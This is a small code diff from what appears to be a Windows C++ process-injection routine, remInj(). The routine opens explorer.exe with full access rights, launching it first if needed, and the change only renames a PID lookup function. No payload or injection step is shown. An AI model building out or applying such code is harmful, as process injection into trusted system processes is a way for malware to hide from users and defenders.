@@ -11,11 +11,11 @@ STARTUPINFO info = { 0 };
 PROCESS_INFORMATION processInfo = { 0 };
 
 int remInj() {
-    if (find() != 0) {
-        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(find()));
+    if (findPID() != 0) {
+        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(findPID()));
     }
     else if (CreateProcess(L"C:\\Windows\\explorer.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &info, &processInfo) != 0) {
-        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(find()));
+        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(findPID()));
     }
     else {
         return 0;
